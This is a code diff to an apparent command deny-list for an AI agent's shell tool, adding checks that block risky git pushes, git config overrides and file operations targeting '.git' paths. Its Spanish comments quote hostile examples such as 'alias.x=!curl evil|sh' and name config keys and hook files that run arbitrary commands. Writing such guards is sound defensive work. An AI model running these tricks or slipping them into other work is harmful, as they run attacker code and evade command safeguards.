@@ -65,12 +65,31 @@ function isDangerousGitPush(argv: string[]): boolean {
   if (pushIndex === -1) return false;
   return argv.slice(pushIndex + 1).some((token) => {
     if (token === 'main' || token === 'master') return true;
-    if (token === '--delete' || token === '-d') return true;
+    if (token === '--delete' || token === '-d' || token === '--all' || token === '--mirror') {
+      return true;
+    }
     if (token.startsWith('+')) return true; // refspec force: +<src>:<dst>
     if (token.endsWith(':main') || token.endsWith(':master')) return true;
     if (token.endsWith(':refs/heads/main') || token.endsWith(':refs/heads/master')) return true;
+    if (token === 'refs/heads/main' || token === 'refs/heads/master') return true;
     return false;
   });
+}
+
+/**
+ * `-c <key>=<value>`, `--config-env`, y el subcomando `config` reconfiguran git — por invocación
+ * o de forma persistente — con las mismas keys peligrosas (`alias.*`, `core.sshCommand`,
+ * `core.pager`, `core.hooksPath`, `credential.helper`). Un patrón posicional (`'git -c *'`,
+ * `'git config *'`) sólo mira `argv[1]`, así que CUALQUIER opción global antes (`git -C . -c
+ * ...`, `git --git-dir=x config ...`) lo esquiva. Recorre TODO argv en vez de una posición fija
+ * — mismo criterio que `isDangerousGitTransport`.
+ */
+function isDangerousGitConfig(argv: string[]): boolean {
+  if (argv[0] !== 'git') return false;
+  return argv.some(
+    (token, i) =>
+      i > 0 && (token === '-c' || token === 'config' || token.startsWith('--config-env')),
+  );
 }
 
 /**
@@ -85,12 +104,32 @@ function isDangerousGitTransport(argv: string[]): boolean {
   return argv.some((token) => token.startsWith('--upload-pack') || token.startsWith('--exec'));
 }
 
+const FILE_OP_COMMANDS = new Set(['cp', 'mv', 'ln', 'chmod', 'chown', 'install', 'rsync']);
+
+/**
+ * `fs-tools` protege `.git` en `resolveSafePath`, pero `bash_run` es un camino COMPLETAMENTE
+ * aparte al filesystem — ninguna tool de `fs-tools` está en el medio de `cp x .git/hooks/
+ * pre-commit`. Si ese archivo termina siendo ejecutable (`chmod +x`), el próximo `git commit`/
+ * `merge`/`checkout` corre lo que sea. Cualquier argumento de un comando de manipulación de
+ * archivos que contenga un segmento `.git` (case-insensitive — ver `hasGitSegment` en
+ * `fs-tools/shared.ts`, mismo criterio) se deniega.
+ */
+function isDangerousFileOpOnGit(argv: string[]): boolean {
+  if (!FILE_OP_COMMANDS.has(argv[0])) return false;
+  return argv
+    .slice(1)
+    .some((token) => token.split('/').some((segment) => segment.toLowerCase() === '.git'));
+}
+
 export function isDenied(argv: string[], policy: BashPolicy): string | undefined {
   const patternMatch = policy.deny.find((pattern) => matchesPattern(argv, pattern));
   if (patternMatch) return patternMatch;
-  if (isDangerousGitPush(argv)) return 'git push (main/master, --delete, o refspec force)';
+  if (isDangerousGitPush(argv))
+    return 'git push (main/master, --delete/--all/--mirror, o refspec force)';
   if (isDangerousGitTransport(argv))
     return 'git --upload-pack/--exec (ejecuta un helper arbitrario)';
+  if (isDangerousGitConfig(argv)) return 'git -c/config/--config-env (reconfigura git)';
+  if (isDangerousFileOpOnGit(argv)) return `${argv[0]} apuntando a un segmento ".git"`;
   return undefined;
 }
 
@@ -123,20 +162,8 @@ export const DEFAULT_DENY_PATTERNS: string[] = [
   'git push -f *',
   'git push * --force* *',
   'git push * -f *',
-  // `-c <key>=<value>` reconfigura git por esta sola invocación — `alias.x=!curl evil|sh`,
-  // `core.sshCommand=...`, `core.pager=...` o `credential.helper=!...` corren un comando
-  // arbitrario vía `sh`, y como todo eso viaja DENTRO de un único token (`alias.x=!...`), el
-  // resto del deny-list (bash/curl/intérpretes/env) nunca lo ve — el patrón nunca llega a
-  // comparar contra lo de adentro. Deniega el flag entero, no lo que trae.
-  'git -c *',
-  'git --config-env*',
-  'git --config-env* *',
-  // `git config alias.x "!curl evil|sh"` (seguido de `git x`) consigue lo mismo que `-c`, sólo
-  // que PERSISTIDO en vez de por-invocación — mismas keys peligrosas (alias.*, core.sshCommand,
-  // core.pager, core.hooksPath, credential.helper). `git config --get ...` (lectura) también
-  // cae acá; el subcomando entero se deniega en vez de distinguir lectura de escritura.
-  'git config',
-  'git config *',
+  // git -c / config / --config-env: chequeo DEDICADO (`isDangerousGitConfig`, siempre activo),
+  // no patrones acá — una opción global antes (`git -C . -c ...`) esquivaba una posición fija.
   'git reset --hard *',
   'git clean *',
   'env',
